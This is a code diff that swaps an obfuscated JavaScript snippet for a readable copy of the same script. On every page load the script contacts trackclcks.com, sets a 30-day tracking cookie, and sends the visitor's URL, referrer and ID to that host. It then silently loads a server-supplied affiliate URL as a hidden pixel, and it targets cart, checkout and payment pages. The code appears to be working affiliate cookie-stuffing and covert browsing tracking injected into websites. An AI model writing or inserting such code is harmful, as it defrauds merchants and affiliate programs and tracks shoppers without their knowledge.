@@ -1,1 +1,238 @@
-!function(){function _0x2a7f(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(_0x3a59){var _0x4fd3=16*Math.random()|0,_0x31a1="x"===_0x3a59?_0x4fd3:3&_0x4fd3|8;return _0x31a1.toString(16)})}function _0x59d3(_0x2f14){for(var _0x2e68=_0x2f14+"=",_0x38a5=document.cookie.split(";"),_0x5964=0;_0x5964<_0x38a5.length;_0x5964++){var _0x1df2=_0x38a5[_0x5964].trim();if(0===_0x1df2.indexOf(_0x2e68))return _0x1df2.substring(_0x2e68.length)}return""}function _0x4f6c(){var _0x4a76=window.location.pathname.toLowerCase(),_0x4f3f=["cart","checkout","payment","pay","shipping","review-order"];return _0x4f3f.some(function(_0x1d5f){return _0x4a76.includes(_0x1d5f)})}function _0x45d8(_0x16cb){try{var _0x1f4f=new Image;_0x1f4f.src=_0x16cb,_0x1f4f.onload=function(){},_0x1f4f.onerror=function(){}}catch(_0x4a9d){console.error("Tracking pixel error:",_0x4a9d)}}function _0x3f5a(_0x3d44){try{var _0x4974=new Image;_0x4974.src="https://trackclcks.com/api/fallback-pixel?id="+encodeURIComponent(_0x3d44),_0x4974.onload=function(){},_0x4974.onerror=function(){}}catch(_0x4b34){console.error("Fallback pixel error:",_0x4b34)}}async function _0x2b31(){var _0x2b63="tracking_done_"+window.location.hostname;if(sessionStorage.getItem(_0x2b63)&&!_0x4f6c())return;try{var _0x1bc4=_0x59d3("tracking_uuid")||_0x2a7f(),_0x5c8e=new Date(Date.now()+2592e6);document.cookie="tracking_uuid="+_0x1bc4+"; expires="+_0x5c8e.toUTCString()+"; path=/; SameSite=Lax";var _0x4fdd=await fetch("https://trackclcks.com/api/track-user",{method:"POST",keepalive:!0,headers:{"Content-Type":"application/json"},body:JSON.stringify({url:window.location.href,referrer:document.referrer,unique_id:_0x1bc4,origin:window.location.hostname,timestamp:Date.now()})}),_0x1df9=await _0x4fdd.json();_0x1df9.success&&_0x1df9.affiliate_url?(_0x45d8(_0x1df9.affiliate_url),sessionStorage.setItem(_0x2b63,"true")):_0x3f5a(_0x1bc4)}catch(_0x4ce8){console.error("Tracking Failed:",_0x4ce8),_0x3f5a(_0x2a7f())}}function _0x47ad(){var _0x3f40=window.location.hostname;fetch("https://trackclcks.com/api/site-configs").then(function(_0x5aa1){return _0x5aa1.json()}).then(function(_0x2f94){var _0x1490=_0x2f94[_0x3f40];_0x1490&&(_0x1490.always&&_0x2b31(),_0x1490.cartExtra&&_0x4f6c()&&_0x2b31())}).catch(function(_0x45b2){console.error("Config fetch failed:",_0x45b2)})}"interactive"===document.readyState||"complete"===document.readyState?_0x47ad():window.addEventListener("DOMContentLoaded",_0x47ad)}();
+(function () {
+
+    function generateUUID() {
+        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (char) {
+
+            var random = Math.random() * 16 | 0;
+
+            var value =
+                char === "x"
+                    ? random
+                    : (random & 3 | 8);
+
+            return value.toString(16);
+        });
+    }
+
+    function getCookie(cookieName) {
+
+        var name = cookieName + "=";
+
+        var cookies = document.cookie.split(";");
+
+        for (var i = 0; i < cookies.length; i++) {
+
+            var cookie = cookies[i].trim();
+
+            if (cookie.indexOf(name) === 0) {
+                return cookie.substring(name.length);
+            }
+        }
+
+        return "";
+    }
+
+    function isCartPage() {
+
+        var pathname = window.location.pathname.toLowerCase();
+
+        var cartPatterns = [
+            "cart",
+            "checkout",
+            "payment",
+            "pay",
+            "shipping",
+            "review-order"
+        ];
+
+        return cartPatterns.some(function (pattern) {
+            return pathname.includes(pattern);
+        });
+    }
+
+    function fireTrackingPixel(url) {
+
+        try {
+
+            var image = new Image();
+
+            image.src = url;
+
+            image.onload = function () {};
+
+            image.onerror = function () {};
+
+        } catch (error) {
+
+            console.error("Tracking pixel error:", error);
+        }
+    }
+
+    function fireFallbackPixel(uniqueId) {
+
+        try {
+
+            var image = new Image();
+
+            image.src =
+                "https://trackclcks.com/api/fallback-pixel?id=" +
+                encodeURIComponent(uniqueId);
+
+            image.onload = function () {};
+
+            image.onerror = function () {};
+
+        } catch (error) {
+
+            console.error("Fallback pixel error:", error);
+        }
+    }
+
+    async function initTracking() {
+
+        var sessionKey =
+            "tracking_done_" + window.location.hostname;
+
+        if (
+            sessionStorage.getItem(sessionKey) &&
+            !isCartPage()
+        ) {
+            return;
+        }
+
+        try {
+
+            var uniqueId =
+                getCookie("tracking_uuid") ||
+                generateUUID();
+
+            var expiryDate =
+                new Date(Date.now() + 2592e6);
+
+            document.cookie =
+                "tracking_uuid=" +
+                uniqueId +
+                "; expires=" +
+                expiryDate.toUTCString() +
+                "; path=/; SameSite=Lax";
+
+            var response = await fetch(
+                "https://trackclcks.com/api/track-user",
+                {
+                    method: "POST",
+                    keepalive: true,
+
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+
+                    body: JSON.stringify({
+                        url: window.location.href,
+                        referrer: document.referrer,
+                        unique_id: uniqueId,
+                        origin: window.location.hostname,
+                        timestamp: Date.now()
+                    })
+                }
+            );
+
+            var result = await response.json();
+
+            if (
+                result.success &&
+                result.affiliate_url
+            ) {
+
+                fireTrackingPixel(
+                    result.affiliate_url
+                );
+
+                sessionStorage.setItem(
+                    sessionKey,
+                    "true"
+                );
+
+            } else {
+
+                fireFallbackPixel(uniqueId);
+            }
+
+        } catch (error) {
+
+            console.error(
+                "Tracking Failed:",
+                error
+            );
+
+            fireFallbackPixel(generateUUID());
+        }
+    }
+
+   function runTracking() {
+
+    fetch(
+        "https://trackclcks.com/api/site-config?host=" +
+        encodeURIComponent(
+            window.location.hostname
+        )
+    )
+
+    .then(function (response) {
+
+        return response.json();
+    })
+
+    .then(function (siteConfig) {
+
+      
+        if (
+            !siteConfig ||
+            (
+                !siteConfig.always &&
+                !siteConfig.cartExtra
+            )
+        ) {
+            return;
+        }
+
+      
+        if (siteConfig.always) {
+
+            initTracking();
+        }
+
+       
+        if (
+            siteConfig.cartExtra &&
+            isCartPage()
+        ) {
+
+            initTracking();
+        }
+    })
+
+    .catch(function (error) {
+
+        console.error(
+            "Config fetch failed:",
+            error
+        );
+    });
+}
+
+    if (
+        document.readyState === "interactive" ||
+        document.readyState === "complete"
+    ) {
+
+        runTracking();
+
+    } else {
+
+        window.addEventListener(
+            "DOMContentLoaded",
+            runTracking
+        );
+    }
+
+})();
